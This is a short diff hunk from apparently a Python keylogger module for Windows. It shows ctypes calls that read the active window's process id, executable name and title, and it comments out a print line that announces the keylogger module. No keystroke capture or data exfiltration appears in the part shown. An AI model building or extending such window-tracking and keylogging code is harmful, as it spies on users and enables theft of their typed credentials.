@@ -26,7 +26,7 @@ def get_current_process():
     window_title = create_string_buffer(512)
     length = user32.GetWindowTextA(hwnd, byref(window_title), 512)
 
-    print("[*] In keyLog module")
+    #print("[*] In keyLog module")
     print("[->] PID: %s - %s - %s " % (process_id, executable.value, window_title.value))
 
     kernel32.CloseHandle(hwnd)
